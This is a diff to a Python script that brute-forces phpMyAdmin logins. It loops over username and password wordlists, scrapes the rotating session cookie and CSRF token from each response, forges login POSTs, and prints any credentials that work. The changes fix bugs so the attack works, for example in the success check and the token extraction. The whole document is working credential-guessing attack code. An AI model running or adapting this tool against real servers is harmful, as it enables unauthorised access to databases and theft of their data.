@@ -28,7 +28,7 @@ PASS_FILE = sys.argv[3]
 #INIT_TOKEN = sys.argv[4]
 #INIT_COOKIE = sys.argv[5]
 
-def forge_post(url, token, cookie, username, password, session):
+def forge_post(url, token, in_cookie, username, password):
 
     #Template
     '''
@@ -48,20 +48,23 @@ def forge_post(url, token, cookie, username, password, session):
     set_session=1c40ba8456f1825f791056a366834e94&pma_username=dfgdfg&pma_password=dfgdfgdfg&server=1&target=index.php&lang=en&debug=0&token=c392014ef9958cce5d96b4b0bffa2879
     '''
 
+    #own post session
+    session = requests.Session()
+
 
     headers = {
         "User-Agent" : "iamjonny the tester",
         "Content-Type": "application/x-www-form-urlencoded",
         "Origin": "null",
-        "Upgrade-Insecure-Requests": 1
+        "Upgrade-Insecure-Requests": "1"
     }
 
-    cookie = {
-        "phpMyAdmin":cookie
+    cookies = {
+        "phpMyAdmin":in_cookie
     }
 
     payload ={
-        "set_session" : cookie,
+        "set_session" : in_cookie,
         "pma_username" :  username,
         "pma_password" : password,
         "server" : 1,
@@ -72,7 +75,7 @@ def forge_post(url, token, cookie, username, password, session):
     }
 
 
-    resp = session.post(url, headers = headers, data=payload, cookies=cookie)
+    resp = session.post(url, headers = headers, data=payload, cookies=cookies)
 
     return resp
 
@@ -85,7 +88,7 @@ def analyze_resp(resp):
     session_match = re.search(r'set_session" value="([a-f0-9]+)"', resp.text)
     
     if session_match:
-        next_cookie = session_match.group(0)
+        next_cookie = session_match.groups(0)[0]
         print("set_session cookie:", next_cookie)
     else:
         return 0
@@ -95,16 +98,16 @@ def analyze_resp(resp):
     token_match = re.search(r'token" value="([a-f0-9]+)"', resp.text)
     
     if token_match:
-        token = token_match.group(0)
+        token = token_match.groups(0)[0]
         print("Token value:", token)
     else:
         return 0
 
     # search for positive password feedback in html body
 
-    pass_match = re.search(r'Login Failed', resp.text)
+    fail_match = re.search(r'Login Failed', resp.text)
 
-    if pass_match:
+    if not fail_match:
         password_correct = True
 
     return (next_cookie, token, password_correct)
@@ -115,11 +118,10 @@ def analyze_resp(resp):
 def main():
 
     #init session
-    actual_session = requests.Session()
-    actual_session.proxies = {'http' : 'localhost:8080', 'https' : 'localhost:8080'}
+    initial_session = requests.Session()
 
     #initial GET request
-    resp = actual_session.get(URL)
+    resp = initial_session.get(URL)
     (cookie, token, password_correct) = analyze_resp(resp)
 
     with open(USER_FILE,"r") as u:
@@ -130,10 +132,11 @@ def main():
                 password_correct = False
 
                 for password in f.readlines():
-                    resp = forge_post(URL, token, cookie, user, password, actual_session)
+                    resp = forge_post(URL, token, cookie, user, password)
                     (cookie, token, password_correct) = analyze_resp(resp)
+                    
                     if password_correct:
-                        print(f"[+] Password match! {user}:{password}")
+                        print(f"[+] Credential match > {user}:{password}")
                         break
 
 
